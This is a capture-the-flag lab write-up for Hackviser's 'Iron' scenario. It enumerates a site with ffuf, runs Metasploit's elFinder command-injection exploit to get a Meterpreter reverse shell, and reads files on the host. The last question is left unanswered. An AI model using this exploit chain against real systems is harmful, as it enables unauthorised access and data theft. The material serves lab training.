---
title: 'Iron'
date: '2026-07-02'
excerpt: 'Easy - Web - System'
prog: 'Hackviser Scenarios -  July 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Iron</h1>
<div class="writeup-date">July 2026 &middot; Scenarios</div>
</div>
</div>
<p class="lead mb-4">According to information received by our Cyber Intelligence Team, a lawyer nicknamed 'IRON' has been posting advertisements on Darkweb claiming to have successfully released criminals from prison.
<br /><br />
According to our intelligence, this lawyer is able to release criminals through a friend who is well known in high level departments.
<br /><br />
Your mission is to identify this lawyer and his friend and hand them over to the security forces.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> Who is the notorious criminal that the lawyer successfully got out of prison?</p>
<p class="mb-3">We open the website <code>http://legalspecialist.hv</code> in a web browser.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image1.png" alt="Iron 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Clicking on the <b>Success Stories</b> tab reveals the name of the notorious criminal.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image2.png" alt="Iron 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Josef Ferguson</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is Emily Johnson's email address?</p>
<p class="mb-3">Running <code>ffuf -u http://[target_IP]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -fc 404</code> to enumerate possible paths of the website reveals a <code>/filemanager</code> path.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image3.png" alt="Iron 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Appending <code>/filemanager</code> to the URL in the web browser brings us to a special page.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image4.png" alt="Iron 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Opening <code>EmilyJohnson.txt</code> to read the contents gives us the following.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image5.png" alt="Iron 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> emily.johnson@mailacc.hv</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> For what crime is a criminal named Benjamin Walker in prison?</p>
<p class="mb-3">We will be using Metasploit to gain access to the target system. Run <code>msfconsole -q</code>, <code>search elFinder</code>, choose <code>exploit/linux/http/elfinder_archive_cmd_injection</code> by entering <code>use 3</code>, <code>set RHOSTS [target_IP]</code>, <code>set LHOST [local_IP]</code> and <code>set TARGETURI /filemanager</code> and then <code>exploit</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image6.png" alt="Iron 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image7.png" alt="Iron 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">A Meterpreter session should open, and we enter <code>shell</code>. To stabilise the shell, we enter <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image8.png" alt="Iron 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">After a while of exploring around, we discover a <code>.zip</code> file named <code>criminals.zip</code> located in <code>/home/user</code> directory. We run <code>unuzip criminals.zip</code> and <code>cat criminals.txt</code> to read the contents of the extracted text file.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/iron/iron_hackviser_image9.png" alt="Iron 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Drug Manufacturing</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> How much is the bribe to be paid to the judge in the Benjamin Walker case?</p>
<p class="mb-5"><strong>Answer:</strong> $2000</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the full name of the lawyer nicknamed IRON?</p>
<p class="mb-3"></p>
<p class="mb-5"><strong>Answer:</strong> </p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">July 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>